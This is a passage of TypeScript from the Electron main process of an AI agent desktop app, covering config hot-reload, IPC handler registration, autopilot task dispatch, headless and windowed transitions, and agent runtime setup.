        console.info(`[${__BRAND_PRODUCT_NAME}] Skills hot-reload complete: ${skillTools.length} skill tools`);
      }

      // CLI tools hot-reload
      const newCliToolsFp = JSON.stringify(config.cliTools ?? []);
      if (newCliToolsFp !== lastCliToolsFingerprint) {
        lastCliToolsFingerprint = newCliToolsFp;
        void shellPathReady
          .then(() => {
            const cliTools = buildCliTools(getConfig, pluginManager.getPluginCliTools());
            updateCliTools(cliTools);
            syncRealtimeTools();
            console.info(`[${__BRAND_PRODUCT_NAME}] CLI tools hot-reload: ${cliTools.length} tools`);
          })
          .catch((err) => {
            console.error(`[${__BRAND_PRODUCT_NAME}] CLI tools hot-reload failed:`, err);
          });
      }

      // Sub-agent concurrency-cap change: retry any resume held back because a cap
      // was full. Raising maxConcurrent/maxPerParent frees admission for retained
      // follow-ups that would otherwise never re-check (no slot-release fires while
      // the blocking run stays active).
      const newSubAgentCapsFp = JSON.stringify(config.tools?.subAgents ?? {});
      if (newSubAgentCapsFp !== lastSubAgentCapsFingerprint) {
        lastSubAgentCapsFingerprint = newSubAgentCapsFp;
        retryPendingSubAgentResumes();
      }

      // Security re-gating on a pure executionMode / isolated-browser-private toggle (R209): neither has an
      // MCP/skills/CLI/browser fingerprint, so without this a global Auto->Plan-First switch would leave a
      // recordless Realtime session with mutating tools, and disabling private access would leave a live
      // isolated browser on WebRTC `default`. syncRealtimeTools() re-resolves realtime plan-first AND
      // reapplies the isolated-browser WebRTC policy (R206).
      const newExecutionModeFp = JSON.stringify(config.tools?.executionMode ?? 'auto');
      const newIsolatedBrowserPrivateFp = JSON.stringify(
        config.computerUse?.safety?.isolatedBrowserAllowPrivateNetwork ?? false,
      );
      if (newExecutionModeFp !== lastExecutionModeFp || newIsolatedBrowserPrivateFp !== lastIsolatedBrowserPrivateFp) {
        lastExecutionModeFp = newExecutionModeFp;
        lastIsolatedBrowserPrivateFp = newIsolatedBrowserPrivateFp;
        syncRealtimeTools();
      }

      // Display list change detection — auto-update maxDimension when allowed displays change
      const newDisplayFp = JSON.stringify(config.computerUse?.localMacos?.allowedDisplays ?? []);
      if (newDisplayFp !== lastDisplayFingerprint) {
        lastDisplayFingerprint = newDisplayFp;
        const allowedDisplays = config.computerUse?.localMacos?.allowedDisplays ?? [];
        if (allowedDisplays.length > 0 && process.platform === 'darwin') {
          void (async () => {
            try {
              const { getLocalMacDisplayLayout } = await import('./computer-use/permissions.js');
              const layout = await getLocalMacDisplayLayout();
              if (!layout || layout.displays.length === 0) return;
              const allowedLower = new Set(allowedDisplays.map((n: string) => n.toLowerCase()));
              const enabled = layout.displays.filter(
                (d: { name: string; displayId: string }) =>
                  allowedLower.has(d.name.toLowerCase()) || allowedLower.has(d.displayId.toLowerCase()),
              );
              if (enabled.length === 0) return;
              const maxDim = Math.max(
                ...enabled.map((d: { pixelWidth: number; pixelHeight: number }) =>
                  Math.max(d.pixelWidth, d.pixelHeight),
                ),
              );
              if (maxDim > 0 && maxDim !== config.computerUse?.capture?.maxDimension) {
                setConfig('computerUse.capture.maxDimension', maxDim);
                console.info(
                  `[${__BRAND_PRODUCT_NAME}] Auto-updated maxDimension to ${maxDim} for ${enabled.length} enabled displays`,
                );
              }
            } catch {
              // Non-fatal
            }
          })();
        }
      }

      // Web server hot-reload (debounced to coalesce rapid config changes)
      const newWebServerFp = JSON.stringify(config.webServer ?? {});
      if (newWebServerFp !== lastWebServerFingerprint) {
        lastWebServerFingerprint = newWebServerFp;
        if (webServerDebounce) clearTimeout(webServerDebounce);
        webServerDebounce = setTimeout(() => {
          webServerDebounce = null;
          const wsConfig = config.webServer;
          // Never START the web server for a pure headless backend that has not
          // been windowed — the port is a GUI-app feature, and a config:set over
          // the local bridge must not be able to expose it before promotion.
          // Promotion (promoteHeadlessToWindowed) starts it per config instead.
          if (wsConfig?.enabled && !hasEverBeenWindowed) {
            console.info(`[${__BRAND_PRODUCT_NAME}] Ignoring web-server enable for a non-windowed headless backend.`);
          } else if (wsConfig?.enabled) {
            restartWebServer(wsConfig)
              .then(() =>
                console.info(
                  `[${__BRAND_PRODUCT_NAME}] Web UI server restarted on ${wsConfig.tls?.enabled ? 'https' : 'http'}://${wsConfig.bindAddress || '0.0.0.0'}:${wsConfig.port}`,
                ),
              )
              .catch((err) => console.error(`[${__BRAND_PRODUCT_NAME}] Web server restart failed:`, err));
          } else {
            stopWebServer()
              .then(() => console.info(`[${__BRAND_PRODUCT_NAME}] Web UI server stopped`))
              .catch((err) => console.error(`[${__BRAND_PRODUCT_NAME}] Web server stop failed:`, err));
          }
        }, 500);
      }

      // Plugin config change forwarding
      pluginManager.onConfigChanged(config);

      // Automation rules hot-reload + broadcast as an automation event
      getAutomationEngine()?.reload(config.automations.rules);
      const nextFingerprints = fingerprintConfig(config);
      const changedKeys = Object.keys(nextFingerprints).filter(
        (k) => nextFingerprints[k] !== lastConfigFingerprints[k],
      );
      lastConfigFingerprints = nextFingerprints;
      if (changedKeys.length > 0) {
        eventBus.emit('app', 'config-changed', { changedKeys });
      }

      // Dictation hotkey hot-reload
      updateDictationConfig(config);

      // App Shots hotkey hot-reload
      updateAppShotsConfig(config);

      // Launch at login
      const newLaunchAtLoginFp = JSON.stringify(config.launchAtLogin ?? false);
      if (newLaunchAtLoginFp !== lastLaunchAtLoginFp) {
        lastLaunchAtLoginFp = newLaunchAtLoginFp;
        app.setLoginItemSettings({ openAtLogin: config.launchAtLogin ?? false });
      }

      // Autopilot config — react to external changes (e.g. settings UI flips
      // the toggle via config:set rather than the orchestrator IPC).
      const newAutopilotFp = JSON.stringify(config.autopilot ?? {});
      if (newAutopilotFp !== lastAutopilotFingerprint) {
        lastAutopilotFingerprint = newAutopilotFp;
        if (taskDispatcherRef) {
          const next = config.autopilot;
          if (next) {
            taskDispatcherRef.updateConfig(next);
            if (next.enabled) {
              taskDispatcherRef.start();
            } else {
              taskDispatcherRef.stop();
            }
          }
        }
      }
    };

    // Register IPC handlers (capture must be installed first for web UI bridge)
    installIpcCapture(ipcMain);
    const { setConfig } = registerConfigHandlers(
      ipcMain,
      APP_HOME,
      handleConfigChanged,
      (event) => {
        const invokeEvent = event as Electron.IpcMainInvokeEvent & { __kaiWebBridge?: boolean };
        // Resolve dynamically: macOS can destroy and later recreate the primary
        // window while these handlers remain registered for the app lifetime.
        const primaryWindow = primaryWindowRef;
        if (!primaryWindow || primaryWindow.isDestroyed()) return false;
        return (
          invokeEvent.__kaiWebBridge !== true &&
          invokeEvent.sender === primaryWindow.webContents &&
          invokeEvent.senderFrame === primaryWindow.webContents.mainFrame
        );
      },
      handleBrowserConfigChanged,
    );
    setBrowserRollbackConfig = setConfig;
    registerConversationHandlers(
      ipcMain,
      APP_HOME,
      getConfig,
      () => pluginManagerRef,
      isConversationTurnActive,
      (event, conversationId) =>
        mayPersistConversationForBrowserAuthority(event, conversationId, () => primaryWindowRef),
    );
    // Broadcast on-demand /compact lock changes to EVERY client (windows + web bridge)
    // so a renderer that didn't start the /compact still blocks a concurrent send before
    // optimistically persisting a user turn the backend would reject. The renderer's
    // compaction-ui store listens on 'conversations:compacting'.
    setCompactionLockNotifier((conversationId, compacting) => {
      const payload = { conversationId, compacting };
      // Individually guarded so a single destroyed window mid-iteration can't skip the
      // remaining windows or the web-client broadcast. (compaction-lock also wraps this
      // whole callback so a throw can never corrupt the lock, but partial fan-out would
      // leave some clients with a stale compacting state until their next resync.)
      for (const win of BrowserWindow.getAllWindows()) {
        try {
          win.webContents.send('conversations:compacting', payload);
        } catch {
          /* window/webContents gone — skip it */
        }
      }
      try {
        broadcastToWebClients('conversations:compacting', payload);
      } catch {
        /* best-effort */
      }
    });
    // Late-joining / reloaded clients sync their initial compacting set via this query.
    ipcMain.handle('conversations:compacting-ids', () => compactingConversationIds());
    registerMcpHandlers(ipcMain);
    registerMemoryHandlers(ipcMain, APP_HOME, getConfig);
    registerSkillsHandlers(ipcMain, APP_HOME);
    registerPlatformHandlers(ipcMain, () => primaryWindowRef);
    registerAppshotHandlers(ipcMain, APP_HOME, getConfig);
    registerDiffHandlers(ipcMain, getConfig);
    // "Install `kai` command in PATH" (VS Code `code`-style). Symlinks/copies the
    // shipped launcher onto a per-user PATH dir; no elevation required.
    ipcMain.handle('cli:install-status', () => getCliInstallStatus());
    ipcMain.handle('cli:install', () => installCliCommand());
    ipcMain.handle('cli:uninstall', () => uninstallCliCommand());
    registerArtifactBundleHandlers(ipcMain);
    registerMicRecorderHandlers(ipcMain);
    registerLiveSttHandlers(ipcMain);
    registerBatchTranscribeHandlers(ipcMain, getConfig);
    registerStreamingSttHandlers(ipcMain, getConfig, getRecorderWindow);

    // Initialize dictation + App Shots (global hotkeys, hidden helper windows,
    // screenshot capture) ONLY when we have a GUI. A headless CLI backend has
    // no user to dictate/screenshot, and their hidden BrowserWindows would
    // otherwise keep the process off the Dock AND suppress idle-shutdown
    // (getAllWindows() > 0). Handlers above are just IPC — harmless to leave
    // registered — but these init calls create windows/hotkeys, so skip them.
    if (!IS_HEADLESS) {
      // Initialize dictation system (global hotkey + STT + text insertion)
      initDictation(getConfig(), setConfig);

      // Initialize App Shots (global hotkey → screenshot + window metadata → composer)
      initAppShots(getConfig());
    }
    registerAppShotsHandlers(ipcMain);

    // Structured renderer diagnostics. The legacy debug:log path used to be
    // ALWAYS ON + unbounded and wrote relative to process.cwd() (often `/` in a
    // packaged app). Route it through the gated/bounded/redacted trace instead.
    ipcMain.on('debug:log', (_event, file: string, message: string) => {
      traceDiagnostic({
        scope: 'renderer',
        event: `legacy.${file.replace(/[^a-zA-Z0-9_-]/g, '')}`,
        fields: { message },
      });
    });
    ipcMain.on('debug:trace', (_event, event: unknown) => {
      if (!event || typeof event !== 'object') return;
      const candidate = event as {
        event?: unknown;
        scope?: unknown;
        level?: unknown;
        correlationId?: unknown;
        conversationId?: unknown;
        fields?: unknown;
      };
      if (typeof candidate.event !== 'string') return;
      // Renderer emits both agent-lifecycle (stream/conversation) and generic
      // events; honor an explicit agent/automation/alert scope, else 'renderer'.
      const scope =
        candidate.scope === 'agent' || candidate.scope === 'automation' || candidate.scope === 'alert'
          ? candidate.scope
          : 'renderer';
      traceDiagnostic({
        scope,
        event: candidate.event.slice(0, 160),
        level:
          candidate.level === 'debug' || candidate.level === 'warn' || candidate.level === 'error'
            ? candidate.level
            : 'info',
        correlationId: typeof candidate.correlationId === 'string' ? candidate.correlationId : undefined,
        conversationId: typeof candidate.conversationId === 'string' ? candidate.conversationId : undefined,
        fields:
          candidate.fields && typeof candidate.fields === 'object'
            ? (candidate.fields as Record<string, unknown>)
            : undefined,
      });
    });
    registerComputerUseHandlers(ipcMain, APP_HOME, getConfig);
    registerClipboardHandlers(ipcMain);
    registerShellHandlers(ipcMain);
    registerBrowserHandlers(ipcMain, () => primaryWindowRef, isPrimaryRendererUrl);
    registerPartitionHandlers(ipcMain);
    registerDiagnosticsHandlers(ipcMain, MAIN_PROCESS_LOG, WINDOW_HEALTH_LOG);
    const taskTerminalManager = new TaskTerminalManager();
    taskTerminalManagerRef = taskTerminalManager;
    registerTaskTerminalHandlers(ipcMain, taskTerminalManager);
    registerAgentEntityHandlers(ipcMain, APP_HOME, taskTerminalManager);

    // Register task handlers with auto-restart callback (fires on kick-back from review)
    registerTaskHandlers(ipcMain, APP_HOME, {
      onTaskKickedBack: (_taskId, assignedAgentId) => {
        if (!assignedAgentId) return;
        console.info(`[Agent:task] Auto-restarting agent ${assignedAgentId} after kick-back`);
        // Deferred so the kick-back write completes first
        setTimeout(() => {
          // startAgentRun returns {error} for expected failures but can still
          // throw on an unexpected one (terminal spawn / mastra / fs). This is
          // fire-and-forget inside a setTimeout, so an uncaught throw would be an
          // unhandled rejection — log and swallow it.
          void startAgentRun(APP_HOME, taskTerminalManager, assignedAgentId).catch((err) => {
            console.error(`[Agent:task] Auto-restart of agent ${assignedAgentId} failed:`, err);
          });
        }, 500);
      },
      onTaskDeleted: (taskId, assignedAgentId) => {
        if (!assignedAgentId) return;
        console.info(`[Agent:task] Stopping agent ${assignedAgentId} — its task ${taskId} was deleted`);
        stopAgentForDeletedTask(APP_HOME, taskTerminalManager, assignedAgentId, taskId);
      },
    });
    registerWorkspaceHandlers(ipcMain, APP_HOME, getConfig, setConfig);

    // Autopilot / orchestrator — drives task auto-assignment when enabled.
    const initialAutopilotConfig = getConfig().autopilot;
    const taskDispatcher = new TaskDispatcher(
      {
        listTasks: () => listAllTasks(APP_HOME),
        listAgents: () => listAllAgents(APP_HOME),
        assignTask: (agentId, taskId) => assignTaskToAgent(APP_HOME, agentId, taskId),
        startAgent: (agentId) => startAgentRun(APP_HOME, taskTerminalManager, agentId),
        getConfig: () => getConfig().autopilot ?? null,
        broadcastState: broadcastOrchestratorState,
        unassignTask: async (agentId: string, taskId: string) => {
          // Clear agent's task reference
          const agentPath = join(APP_HOME, 'data', 'agents', `${agentId}.json`);
          if (existsSync(agentPath)) {
            const agent = JSON.parse(readFileSync(agentPath, 'utf-8'));
            if (agent.currentTaskId === taskId) {
              agent.currentTaskId = undefined;
              agent.status = 'idle';
              agent.updatedAt = new Date().toISOString();
              writeFileSync(agentPath, JSON.stringify(agent, null, 2), 'utf-8');
            }
          }
          // Clear task's agent reference
          const taskPath = join(APP_HOME, 'data', 'tasks', `${taskId}.json`);
          if (existsSync(taskPath)) {
            const task = JSON.parse(readFileSync(taskPath, 'utf-8'));
            if (task.assignedAgentId === agentId) {
              task.assignedAgentId = undefined;
              task.updatedAt = new Date().toISOString();
              writeFileSync(taskPath, JSON.stringify(task, null, 2), 'utf-8');
              broadcastTaskChange(APP_HOME, { type: 'system' });
            }
          }
        },
        assignReviewers: async (taskId: string, _reviewerIds: string[], mode: string) => {
          // AI-powered reviewer selection
          const { selectReviewers } = await import('./agent/reviewer-selection.js');
          const agents = listAllAgents(APP_HOME);
          const reviewerAgents = agents.filter((a) => a.role === 'reviewer' && a.status === 'idle');
          const config = getConfig();
          const minReviewers = config?.autopilot?.reviewPolicy?.minReviewers ?? 2;

          const taskPath = join(APP_HOME, 'data', 'tasks', `${taskId}.json`);
          if (!existsSync(taskPath)) return;
          const task = JSON.parse(readFileSync(taskPath, 'utf-8'));

          // Only assign if task doesn't already have enough reviewers
          const currentCount = task.reviewerAgentIds?.length ?? 0;
          if (currentCount >= minReviewers) return;

          const needed = minReviewers - currentCount;
          const selectedIds = await selectReviewers(task, reviewerAgents, needed);
          if (selectedIds.length === 0) return;

          task.reviewerAgentIds = [...(task.reviewerAgentIds ?? []), ...selectedIds];
          task.reviewMode = mode as 'parallel' | 'sequential';
          task.updatedAt = new Date().toISOString();
          writeFileSync(taskPath, JSON.stringify(task, null, 2), 'utf-8');
          broadcastTaskChange(APP_HOME, { type: 'system' });
          console.info(`[Autopilot] Auto-assigned ${selectedIds.length} reviewers to task "${task.title}"`);
        },
        attemptUnblock: async (taskId: string) => {
          const { attemptUnblock } = await import('./agent/task-unblocker.js');
          const taskPath = join(APP_HOME, 'data', 'tasks', `${taskId}.json`);
          if (!existsSync(taskPath)) return false;
          const task = JSON.parse(readFileSync(taskPath, 'utf-8'));

          const result = await attemptUnblock(task);
          if (result.resolved) {
            task.status = 'in_progress';
            task.unblockAttempts = (task.unblockAttempts ?? 0) + 1;
            if (!task.reviewNotes) task.reviewNotes = [];
            task.reviewNotes.push({
              source: 'ai',
              content: `[Autopilot] Unblocked: ${result.resolution}`,
              timestamp: new Date().toISOString(),
              fromStatus: 'blocked',
            });
            task.updatedAt = new Date().toISOString();
            writeFileSync(taskPath, JSON.stringify(task, null, 2), 'utf-8');
            broadcastTaskChange(APP_HOME, { type: 'system' });
            console.info(`[Autopilot] Unblocked task "${task.title}": ${result.resolution}`);

            // Auto-restart the assigned agent
            if (task.assignedAgentId) {
              const restartAgentId = task.assignedAgentId;
              setTimeout(() => {
                // Fire-and-forget: startAgentRun can throw on an unexpected
                // failure, which would be an unhandled rejection here — log it.
                void startAgentRun(APP_HOME, taskTerminalManager, restartAgentId).catch((err) => {
                  console.error(`[Autopilot] Auto-restart of agent ${restartAgentId} failed:`, err);
                });
              }, 500);
            }
            return true;
          } else {
            task.unblockAttempts = (task.unblockAttempts ?? 0) + 1;
            task.updatedAt = new Date().toISOString();
            writeFileSync(taskPath, JSON.stringify(task, null, 2), 'utf-8');
            broadcastTaskChange(APP_HOME, { type: 'system' });
            console.info(`[Autopilot] Cannot unblock "${task.title}": ${result.reason}`);
            return false;
          }
        },
      },
      initialAutopilotConfig,
    );
    registerOrchestratorHandlers(ipcMain, taskDispatcher, APP_HOME, { setConfig });
    if (initialAutopilotConfig?.enabled) {
      taskDispatcher.start();
    }
    taskDispatcherRef = taskDispatcher;
    registerUsageHandlers(ipcMain, APP_HOME);
    registerAutoUpdateHandlers(ipcMain, () => {
      updateDownloaded = true;
      buildMenu();
    });
    registerOtaHandlers(ipcMain, codePaths, __BRAND_APP_SLUG, __APP_VERSION);

    // Auto-seed computer use display settings on startup.
    // If allowedDisplays is empty, populate it with all discovered displays
    // and set capture.maxDimension to the largest pixel dimension.
    (async () => {
      try {
        if (process.platform !== 'darwin') return;
        const config = getConfig();
        const currentDisplays = config.computerUse?.localMacos?.allowedDisplays ?? [];
        if (currentDisplays.length > 0) return; // Already seeded

        const { getLocalMacDisplayLayout } = await import('./computer-use/permissions.js');
        const layout = await getLocalMacDisplayLayout();
        if (!layout || layout.displays.length === 0) return;

        const allNames = layout.displays.map((d: { name: string }) => d.name);
        setConfig('computerUse.localMacos.allowedDisplays', allNames);

        const maxDim = Math.max(
          ...layout.displays.map((d: { pixelWidth: number; pixelHeight: number }) =>
            Math.max(d.pixelWidth, d.pixelHeight),
          ),
        );
        if (maxDim > 0) {
          setConfig('computerUse.capture.maxDimension', maxDim);
        }
        console.info(`[${__BRAND_PRODUCT_NAME}] Auto-seeded ${allNames.length} displays, maxDimension=${maxDim}`);
      } catch (err) {
        console.warn(`[${__BRAND_PRODUCT_NAME}] Display auto-seed failed (non-fatal):`, err);
      }
    })();

    // Plugin system
    const pluginManager = new PluginManager(
      join(APP_HOME, 'plugins'),
      APP_HOME,
      getConfig,
      setConfig, // Unified setConfig that handles models.* persistence correctly
      getBrandRequiredPluginNames(),
      revokeBrowserHostRendererAccess,
    );
    pluginManager.setBrowserAssistantRevocationHandler(revokeBrowserAssistantAccess);
    registerPluginHandlers(
      ipcMain,
      pluginManager,
      () => primaryWindowRef,
      () => {
        revokeBrowserHostRendererAccess();
      },
      primaryRendererUrl,
    );
    pluginManagerRef = pluginManager;
    setUpdateHookRunner(pluginManager);

    // Register agent handlers after pluginManager so inference providers are available
    registerAgentHandlers(
      ipcMain,
      APP_HOME,
      pluginManager,
      () => primaryWindowRef,
      resolveRealtimeBrowserApprovalOwner,
    );

    // A fresh backend has no in-flight runs. If a previous leader died mid-run,
    // stale `running`/`awaiting-approval` runStatus is left on disk — sweep it to
    // idle before serving clients so nothing shows a stuck spinner or blocks new
    // submits.
    try {
      resetStaleRunStatus(APP_HOME);
    } catch (err) {
      console.warn(`[${__BRAND_PRODUCT_NAME}] stale runStatus sweep failed (non-fatal):`, err);
    }

    // Reconcile GHOST index entries left by a delete/clear whose durable index write failed before
    // this process started (R165 f-2): drop entries whose record file is gone and durably tombstone
    // their ids, so a deleted chat can't reappear or be resurrected after restart. Run this BEFORE
    // reindexIfStale (R166 f-1): a stale-schema rebuild (rebuildIndexFromConversationFiles) would
    // otherwise silently DROP the ghost entries (their files are gone) WITHOUT adding them to the
    // durable deletedIds ring, so reconcile could no longer discover them and a stale put could
    // recreate the deleted conversation.
    try {
      reconcileGhostIndexEntries(APP_HOME);
    } catch (err) {
      console.warn(`[${__BRAND_PRODUCT_NAME}] ghost-index reconcile failed (non-fatal):`, err);
    }

    // One-time index backfill: older index.json files lack precomputed fields
    // (hasComputerUse/hasMedia) added for the chats-list advanced filters. Rebuild
    // the summaries once so those filters work on pre-existing conversations.
    try {
      reindexIfStale(APP_HOME);
    } catch (err) {
      console.warn(`[${__BRAND_PRODUCT_NAME}] conversation reindex failed (non-fatal):`, err);
    }

    // Start the local IPC socket EARLY — as soon as the conversation/agent IPC
    // handlers exist — so the `kai` CLI can connect in ~1s instead of waiting
    // for the slow tool-registry / plugin / marketplace init that follows. The
    // leader always serves it (it holds the single-instance lock), independent
    // of the user-facing web server toggle. A headless (CLI-spawned) backend
    // enables idle shutdown so it doesn't outlive its clients; a windowed GUI
    // leader persists.
    startLocalServer({
      idleShutdown: IS_HEADLESS,
      serverVersion: app.getVersion(),
      // What keeps a headless/demoted backend alive besides local CLI sockets:
      // connected web-UI clients. (Windows don't count — a headless backend
      // blocks/destroys them; a windowed GUI leader doesn't enable idleShutdown
      // at all so this predicate is moot there.) A demoted GUI leader that was
      // serving the web UI must not idle-exit while a browser is still attached.
      hasOtherClients: () => webClients.size > 0,
      onIdleExit: () => {
        console.info(`[${__BRAND_PRODUCT_NAME}] Headless backend idle with no clients — shutting down.`);
        app.quit();
        // Hard-exit fallback: if before-quit teardown stalls (async plugin
        // cleanup, pending work), force the process down so a headless backend
        // never lingers after its clients are gone.
        setTimeout(() => {
          app.exit(0);
        }, BROWSER_FORCE_EXIT_GRACE_MS).unref();
      },
    })
      .then((socketPath) => console.info(`[${__BRAND_PRODUCT_NAME}] Local CLI bridge listening at ${socketPath}`))
      .catch((err) => {
        console.error(`[${__BRAND_PRODUCT_NAME}] Local CLI bridge failed to start:`, err);
        // A headless backend with no reachable socket is useless AND would hold
        // the singleton lock forever, blocking every future CLI/GUI launch. Exit
        // so the next launch can take over. A windowed GUI leader keeps running
        // (the socket is a bonus there, not its reason to exist).
        if (headlessWindowBlockActive) {
          app.quit();
          setTimeout(() => {
            if (headlessWindowBlockActive) app.exit(1);
          }, BROWSER_FORCE_EXIT_GRACE_MS).unref();
        }
      });

    // Headless update-restart watcher: a detached headless leader (spawned by a
    // prior `kai` CLI) is NOT touched by a GUI-driven quitAndInstall, so after an
    // update it would keep serving OLD code to new CLIs. When the GUI downloads a
    // newer version it writes an update-ready signal into the shared run dir; a
    // headless leader watches for it and self-exits ONCE IDLE (no active stream),
    // so the next `kai` connect spawns a fresh backend on the new version. Guarded
    // to headless — a windowed GUI leader updates itself normally.
    if (IS_HEADLESS) {
      const watcher = setInterval(() => {
        if (!shouldStepAsideForUpdate(app.getVersion())) return;
        if (hasActiveStreams()) return; // never bail mid-turn — wait for the next tick
        console.info(
          `[${__BRAND_PRODUCT_NAME}] Newer version downloaded — headless backend stepping aside to restart.`,
        );
        clearInterval(watcher);
        app.quit();
        setTimeout(() => app.exit(0), BROWSER_FORCE_EXIT_GRACE_MS).unref();
      }, 5000);
      watcher.unref();
    }

    // ── Headless ⇄ windowed transitions ──────────────────────────────────
    // A single leader process can start headless (spawned by the CLI) and later
    // gain/lose a GUI window as GUIs open/close, without ever tearing down the
    // backend the CLIs depend on.
    let guiInitialized = !IS_HEADLESS; // GUI-only subsystems already set up at boot?

    const ensureGuiSubsystems = (): void => {
      if (guiInitialized) return;
      guiInitialized = true;
      try {
        setMacDockIcon(); // headless boot skipped this; a promoted window needs the icon
        initDictation(getConfig(), setConfig);
        initAppShots(getConfig());
      } catch (err) {
        console.warn(`[${__BRAND_PRODUCT_NAME}] GUI subsystem init on promotion failed (non-fatal):`, err);
      }
    };

    promoteHeadlessToWindowed = async (): Promise<void> => {
      if (!headlessWindowBlockActive) {
        // Already windowed — just focus.
        focusPrimaryWindow();
        return;
      }
      console.info(`[${__BRAND_PRODUCT_NAME}] Promoting headless backend to windowed (GUI launched).`);
      headlessWindowBlockActive = false; // allow windows to show again
      hasEverBeenWindowed = true; // GUI now present — web-server hot-reload may apply
      disableIdleShutdown(); // a GUI now holds this backend; don't idle-exit
      if (process.platform === 'darwin') {
        // Return to a normal foreground app: regular activation policy lets an
        // interactive window paint + focus (accessory apps can't foreground a
        // standard window), and re-show the Dock icon.
        app.setActivationPolicy?.('regular');
        app.dock?.show();
      }
      ensureGuiSubsystems();
      // A headless backend skips the web server at boot (it's a GUI-app feature).
      // On promotion to a real GUI, honor the config: start it if enabled and not
      // already running. startWebServer is idempotent (stops any existing first).
      const webServerConfig = getConfig().webServer;
      if (webServerConfig?.enabled) {
        startWebServer(webServerConfig)
          .then(() =>
            console.info(
              `[${__BRAND_PRODUCT_NAME}] Web UI server started on promotion at ${webServerConfig.tls?.enabled ? 'https' : 'http'}://${webServerConfig.bindAddress || '0.0.0.0'}:${webServerConfig.port}`,
            ),
          )
          .catch((err) => console.error(`[${__BRAND_PRODUCT_NAME}] Web server failed to start on promotion:`, err));
      }
      const win = createWindow();
      win.once('ready-to-show', () => {
        if (!win.isDestroyed()) {
          win.show();
          win.focus();
        }
      });
    };

    // Called when the primary GUI window closes (or from window-all-closed): if
    // socket clients (CLIs) or web clients remain, revert to a dockless
    // background backend that idle-exits once the last client leaves — instead
    // of lingering as a dock app. Tearing down GUI-only services here is what
    // actually makes it headless: dictation eagerly creates a HIDDEN overlay
    // window, so without this a closed main window would leave that window alive
    // (window-all-closed never fires) and hotkeys/overlays would keep running.
    const demoteWindowedToHeadless = (): void => {
      if (headlessWindowBlockActive) return; // already headless
      console.info(`[${__BRAND_PRODUCT_NAME}] No primary window — reverting to headless background backend.`);
      headlessWindowBlockActive = true;
      // Suspend GUI-only subsystems (global hotkeys + hidden overlay/recorder
      // windows). The web server stays up on purpose — it serves web clients and
      // is counted by hasOtherClients() to keep the backend alive. Reset the
      // init latch so a later promotion re-initializes these.
      try {
        cleanupDictation();
        cleanupAppShots();
        closeAllOverlayWindows();
      } catch (err) {
        console.warn(`[${__BRAND_PRODUCT_NAME}] GUI subsystem teardown on demote failed (non-fatal):`, err);
      }
      guiInitialized = false;
      if (process.platform === 'darwin') {
        app.dock?.hide();
        app.setActivationPolicy?.('accessory');
      }
      // Re-arm idle self-shutdown so the backend reaps once its last CLI leaves.
      restartIdleShutdown();
    };
    demoteWindowedToHeadlessRef = demoteWindowedToHeadless;

    // Promotion is now wired. Drain a GUI launch that raced ahead of this
    // assignment (second-instance arrived during startup).
    promoteReady = true;
    if (pendingPromote) {
      pendingPromote = false;
      if (headlessWindowBlockActive) void promoteHeadlessToWindowed();
    }

    // Automation event bus + engine (needs pluginManager for plugin-action dispatch,
    // getRegisteredTools for tool actions, and getConfig for rule reload).
    registerBuiltinSources(eventBus);
    const workspaceToolsReady = (async () => {
      try {
        const { createWorkspaceToolDefinitions } = await import('./agent/mastra-agent.js');
        setWorkspaceToolDefinitions(await createWorkspaceToolDefinitions(homedir(), getConfig));
      } catch (err) {
        console.warn(`[${__BRAND_PRODUCT_NAME}] Workspace tool init for automations failed (non-fatal):`, err);
      }
    })();
    const automationDeps = {
      bus: eventBus,
      appHome: APP_HOME,
      getConfig,
      getAutomationsConfig: () => getConfig().automations,
      getRegisteredTools,
      getWorkspaceTools: getWorkspaceToolDefinitions,
      handlePluginAction: (payload: PluginActionPayload) => pluginManager.handleAction(payload),
      // Busy-target mid-turn injection (registerAgentHandlers ran at startup, so
      // the helper is bound by now). Read lazily so a null during early init
      // simply falls back to divert.
      injectUserTurnAndRestart: (conversationId: string, userText: string, o?: Record<string, unknown>) => {
        const fn = getInjectUserTurnAndRestart();
        if (!fn) return Promise.resolve({ ok: false, error: 'inject-unavailable' });
        return fn(conversationId, userText, o as never);
      },
      // Effective-runtime resolver so an alert/recovered-answer resume of a
      // non-Mastra-runtime conversation dispatches through the runtime-resolving
      // inject path instead of the Mastra-only streamForPlugin path (R94).
      resolveEffectiveRuntimeId: (o: { modelKey?: string; profileKey?: string; runtimeOverride?: string | null }) =>
        resolveEffectiveRuntimeId(o),
    };
    const automationEngine = initializeAutomationEngine(automationDeps);
    registerAutomationsHandlers(ipcMain, automationEngine, eventBus);

    // Alerts: reuse the automation action deps to resume a conversation after
    // the user answers an alert (request_review / ask_user headless fallback).
    initializeAlerts({
      appHome: APP_HOME,
      getActionDeps: () => automationDeps,
      alertSurface: () => resolveAlertSurface(getConfig().automations ?? {}),
      // Lets the recovered-answer durability alert reconcile against the run lifecycle
      // (dismiss on deferred commit; keep once the run ends uncommitted) — R119.
      isConversationTurnActive,
    });
    registerAlertsHandlers(ipcMain);

    // Persist the authoritative per-conversation executionMode in MAIN when a
    // plan-mode tool switches it, BEFORE its (fire-and-forget) renderer broadcast — so
    // a window reloading during the transition doesn't leave the conversation on the
    // stale mode for its next turn (R108 finding-4).
    setExecutionModePersister((conversationId, mode) => {
      // Return whether the authoritative disk write SUCCEEDED so a plan-first enter can FAIL
      // CLOSED (R136 f-1): if plan-first can't be persisted, the tool must not let the renderer
      // restart into a plan-first the trust-disk reconcile can't see (it would read stale 'auto'
      // and run mutating tools).
      try {
        const conv = readConversationRecord(APP_HOME, conversationId);
        if (!conv) return false;
        writeConversationRecord(APP_HOME, { ...conv, executionMode: mode } as never);
        return true;
      } catch {
        return false;
      }
    });

    // Register available agent runtimes
    registerRuntime(new MastraRuntime());
    registerRuntime(new ClaudeAgentRuntime());
    registerRuntime(new CodexRuntime());
    registerRuntime(new PiRuntime());
    registerRuntime(new OpencodeRuntime());

    // Listen for plugin tool changes before plugin activation so early registrations are not missed
    pluginManager.onToolsChanged((pluginTools) => {
      updatePluginTools(pluginTools);
      syncRealtimeTools();
    });

    // Rebuild CLI tools when a plugin contributes a new CLI tool
    pluginManager.onCliToolsChanged(() => {
      void shellPathReady.then(() => {
        const cliTools = buildCliTools(getConfig, pluginManager.getPluginCliTools());
        updateCliTools(cliTools);
        syncRealtimeTools();
        console.info(`[${__BRAND_PRODUCT_NAME}] Plugin CLI tools updated: ${cliTools.length} tools`);
      });
    });

    // Titlebar double-click handler (macOS zoom/minimize respecting System Preferences)
    ipcMain.handle('titlebar:double-click', () => {
      const win = BrowserWindow.getFocusedWindow();
